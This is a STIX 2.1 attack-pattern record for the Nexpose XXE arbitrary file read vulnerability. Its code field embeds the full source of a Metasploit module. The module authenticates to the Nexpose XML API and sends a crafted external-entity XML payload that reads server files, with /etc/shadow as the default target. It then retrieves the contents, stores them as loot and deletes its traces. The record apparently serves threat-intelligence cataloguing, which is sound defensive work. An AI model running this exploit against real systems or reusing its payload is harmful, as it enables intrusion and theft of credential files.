{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--59a1cf72-09c2-4f23-ad13-6618ee5ae609",
    "created": "2024-08-14T16:23:54.310852Z",
    "modified": "2024-08-14T16:23:54.310856Z",
    "name": "Nexpose XXE Arbitrary File Read",
    "description": " Nexpose v5.7.2 and prior is vulnerable to a XML External Entity attack via a number of vectors. This vulnerability can allow an attacker to a craft special XML that could read arbitrary files from the filesystem. This module exploits the vulnerability via the XML API. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/nexpose_xxe_file_read.rb",
            "external_id": "nexpose_xxe_file_read.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/08/16/r7-vuln-2013-07-24/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'nexpose'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Nexpose XXE Arbitrary File Read',\n        'Description' => %q{\n          Nexpose v5.7.2 and prior is vulnerable to a XML External Entity attack via a number\n          of vectors. This vulnerability can allow an attacker to a craft special XML that\n          could read arbitrary files from the filesystem. This module exploits the\n          vulnerability via the XML API.\n        },\n        'Author' => [\n          'Brandon Perry <bperry.volatile[at]gmail.com>', # Initial discovery and Metasploit module\n          'Drazen Popovic <drazen.popvic[at]infigo.hr>',  # Independent discovery, alternate vector\n          'Bojan Zdrnja <bojan.zdrnja[at]infigo.hr>'      # Independently reported\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://www.rapid7.com/blog/post/2013/08/16/r7-vuln-2013-07-24/' ]\n        ],\n        'DefaultOptions' => {\n          'SSL' => true\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(3780),\n        OptString.new('USERNAME', [true, 'The Nexpose user', nil]),\n        OptString.new('PASSWORD', [true, 'The Nexpose password', nil]),\n        OptString.new('FILEPATH', [true, 'The filepath to read on the server', '/etc/shadow'])\n      ]\n    )\n  end\n\n  def run\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n    trust_store = datastore['TRUST_STORE']\n\n    nsc = Nexpose::Connection.new(rhost, user, pass, rport, nil, nil, trust_store)\n\n    print_status('Authenticating as: ' << user)\n    begin\n      nsc.login\n\n      connection_details = {\n        module_fullname: fullname,\n        username: user,\n        private_data: pass,\n        private_type: :password,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }.merge(service_details)\n      create_credential_and_login(connection_details)\n    rescue StandardError\n      print_error('Error authenticating, check your credentials')\n      return\n    end\n\n    xml = '<!DOCTYPE foo ['\n    xml << '<!ELEMENT host ANY>'\n    xml << %(<!ENTITY xxe SYSTEM \"file://#{datastore['FILEPATH']}\">)\n    xml << ']>'\n    xml << '<SiteSaveRequest session-id=\"'\n\n    xml << nsc.session_id\n\n    xml << '\">'\n    xml << '<Site id=\"-1\" name=\"fdsa\" description=\"fdfdsa\">'\n    xml << '<Hosts>'\n    xml << '<host>&xxe;</host>'\n    xml << '</Hosts>'\n    xml << '<Credentials />'\n    xml << '<Alerting />'\n    xml << '<ScanConfig configID=\"-1\" name=\"fdsa\" templateID=\"full-audit\" />'\n    xml << '</Site>'\n    xml << '</SiteSaveRequest>'\n\n    print_status('Sending payload')\n    begin\n      fsa = nsc.execute(xml)\n    rescue StandardError\n      print_error('Error executing API call for site creation, ensure the filepath is correct')\n      return\n    end\n\n    doc = REXML::Document.new fsa.raw_response_data\n    id = doc.root.attributes['site-id']\n\n    xml = \"<SiteConfigRequest session-id='\" << nsc.session_id << \"' site-id='\" << id << \"' />\"\n\n    print_status('Retrieving file')\n    begin\n      fsa = nsc.execute(xml)\n    rescue StandardError\n      nsc.site_delete id\n      print_error('Error retrieving the file.')\n      return\n    end\n\n    doc = REXML::Document.new fsa.raw_response_data\n\n    print_status('Cleaning up')\n    begin\n      nsc.delete_site id\n    rescue StandardError\n      print_warning('Error while cleaning up site ID, manual cleanup required!')\n    end\n\n    unless doc.root.elements['//host']\n      print_error('No file returned. Either the server is patched or the file did not exist.')\n      return\n    end\n\n    path = store_loot('nexpose.file', 'text/plain', rhost, doc.root.elements['//host'].first.to_s, \"File from Nexpose server #{rhost}\")\n    print_good('File saved to path: ' << path)\n  end\nend\n"
}